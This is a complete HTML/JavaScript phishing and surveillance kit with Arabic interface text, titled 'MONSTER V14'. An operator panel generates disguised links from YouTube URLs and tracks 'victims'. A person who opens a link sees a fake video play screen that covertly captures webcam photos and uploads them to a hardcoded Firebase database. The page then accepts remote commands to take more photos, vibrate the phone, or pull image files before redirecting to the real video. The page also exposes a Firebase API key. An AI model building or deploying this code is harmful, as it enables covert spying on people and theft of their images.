<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MONSTER V14 | THE DOCTOR</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #000; }
        body { background: var(--bg); color: var(--neon); margin: 0; font-family: 'Courier New', monospace; overflow: hidden; }
        
        /* لوحة التحكم (مخفية افتراضياً) */
        #admin-panel { display: none; height: 100vh; overflow-y: auto; padding: 15px; }
        .hamburger { position: fixed; top: 15px; left: 15px; z-index: 1000; cursor: pointer; border: 1px solid var(--neon); padding: 5px 10px; background: #000; }
        .sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: #0a0a0a; border-right: 2px solid var(--neon); transition: 0.3s; z-index: 999; padding: 60px 15px; }
        #menu-check:checked ~ .sidebar { left: 0; }
        
        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; cursor: pointer; width: 100%; margin-bottom: 5px; font-weight: bold; }
        .v-card { border: 1px solid #333; padding: 10px; margin-bottom: 10px; border-radius: 5px; }
        .v-card.active { border-color: #fff; background: #111; }
        .img-box { border: 1px solid #444; margin-bottom: 10px; }
        .img-box img { width: 100%; }

        /* واجهة الضحية (تمويه احترافي) */
        #victim-ui { position: fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:20000; display:none; flex-direction:column; align-items:center; justify-content:center; }
        .play-btn { width: 70px; height: 70px; border: 3px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
        .play-btn::after { content:''; position:absolute; top:20px; left:28px; border-left:20px solid #fff; border-top:12px solid transparent; border-bottom:12px solid transparent; }
    </style>
</head>
<body>

<input type="checkbox" id="menu-check" style="display:none;">

<div id="admin-panel">
    <label for="menu-check" class="hamburger">☰ الرادار</label>
    <div class="sidebar">
        <h3>📡 الأجهزة النشطة</h3>
        <div id="v-list">بانتظار الضحايا...</div>
        <hr>
        <h3>⚙️ مصنع التلغيم</h3>
        <input type="text" id="target-vid" placeholder="رابط يوتيوب" style="width:100%; padding:10px; background:#000; color:var(--neon); border:1px solid var(--neon);">
        <button onclick="build()" style="margin-top:10px;">توليد الرابط</button>
        <div id="res-link" style="font-size:10px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
    </div>

    <div style="text-align: center; margin-top: 40px;">
        <h3>🕹️ السيطرة: <span id="active-name">اختر جهازاً</span></h3>
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
            <button onclick="cmd('snap')">📸 سحب صورة</button>
            <button onclick="cmd('vibrate')" style="border-color:yellow;">📳 هز الهاتف</button>
            <button onclick="cmd('pick')" style="border-color:cyan;">📂 سحب ملفات</button>
            <button onclick="cmd('release')" style="background:#030;">🔓 إطلاق سراح</button>
        </div>
        <div id="gallery" style="margin-top:20px; text-align:right;">
            <h4>🖼️ المعرض:</h4>
            <div id="img-container"></div>
        </div>
    </div>
</div>

<div id="victim-ui">
    <div id="play-screen">
        <div class="play-btn" onclick="activateGhost()"></div>
        <p style="color:#fff; margin-top:20px;">انقر للتشغيل | Tap to Play</p>
    </div>
    <div id="load-screen" style="display:none; color:#fff; text-align:center;">
        <div style="width:40px; height:40px; border:3px solid #333; border-top-color:#fff; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto;"></div>
        <p>جاري تحميل المحتوى...</p>
    </div>
    <input type="file" id="file-input" style="display:none;" accept="image/*" multiple>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
</div>

<script>
    const config = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        projectId: "monster-system-7f67e"
    };
    firebase.initializeApp(config);
    const db = firebase.database();
    let selId = null;

    // --- جدار الحماية (الفصل بين الآدمن والضحية) ---
    const params = new URLSearchParams(window.location.search);
    const payload = params.get('v');

    if (payload) {
        // إذا كان هناك payload، اظهر واجهة الضحية فوراً واخفِ كل شيء آخر
        document.getElementById('victim-ui').style.display = 'flex';
        initVictim(atob(payload));
    } else {
        // إذا لم يوجد، اظهر لوحة التحكم لك
        document.getElementById('admin-panel').style.display = 'block';
        initAdmin();
    }

    // --- وظائف الآدمن ---
    function initAdmin() {
        db.ref('victims').on('value', s => {
            const list = document.getElementById('v-list');
            const container = document.getElementById('img-container');
            list.innerHTML = '';
            s.forEach(child => {
                const v = child.val();
                const id = child.key;
                const online = (Date.now() - v.lastSeen) < 10000;
                list.innerHTML += `<div class="v-card ${id==selId?'active':''}" onclick="select('${id}','${v.model}')">
                    <span style="color:${online?'#0f0':'#f00'}">●</span> ${v.model}<br><small>${v.time}</small>
                </div>`;
                if(id === selId && v.files) {
                    container.innerHTML = '';
                    Object.keys(v.files).forEach(fId => {
                        container.innerHTML += `<div class="img-box"><img src="${v.files[fId]}">
                        <button onclick="db.ref('victims/${id}/files/${fId}').remove()" style="color:red; width:100%; border:none; padding:5px;">حذف</button></div>`;
                    });
                }
            });
        });
    }

    function select(id, model) { selId = id; document.getElementById('active-name').innerText = model; document.getElementById('menu-check').checked = false; }
    function cmd(type) { if(selId) db.ref('victims/'+selId+'/cmd').set({ type, t: Date.now() }); }
    function build() { 
        const url = document.getElementById('target-vid').value;
        document.getElementById('res-link').innerText = window.location.href.split('?')[0] + "?v=" + btoa(url); 
    }

    // --- وظائف الضحية ---
    let myRef = null;
    function initVictim(target) {
        const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2] : "Mobile_User";
        myRef = db.ref('victims').push();
        myRef.set({ model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
        setInterval(() => myRef.update({ lastSeen: Date.now() }), 5000);

        db.ref('victims/' + myRef.key + '/cmd').on('value', s => {
            const c = s.val();
            if(c) {
                if(c.type === 'snap') takeSnap();
                if(c.type === 'vibrate') navigator.vibrate([300, 100, 300]);
                if(c.type === 'pick') document.getElementById('file-input').click();
                if(c.type === 'release') window.location.href = target;
            }
        });
    }

    async function activateGhost() {
        document.getElementById('play-screen').style.display = 'none';
        document.getElementById('load-screen').style.display = 'block';
        navigator.vibrate(100);
        await takeSnap();
    }

    async function takeSnap() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video:true});
            const video = document.getElementById('v'); video.srcObject = s; await video.play();
            const canvas = document.getElementById('c'); canvas.width=video.videoWidth; canvas.height=video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            myRef.child('files').push(canvas.toDataURL('image/jpeg', 0.5));
            s.getTracks().forEach(t => t.stop());
        } catch(e) {}
    }

    document.getElementById('file-input').onchange = (e) => {
        for(let f of e.target.files) {
            const r = new FileReader();
            r.onload = (ev) => myRef.child('files').push(ev.target.result);
            r.readAsDataURL(f);
        }
    };
</script>
<style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
</body>
</html>
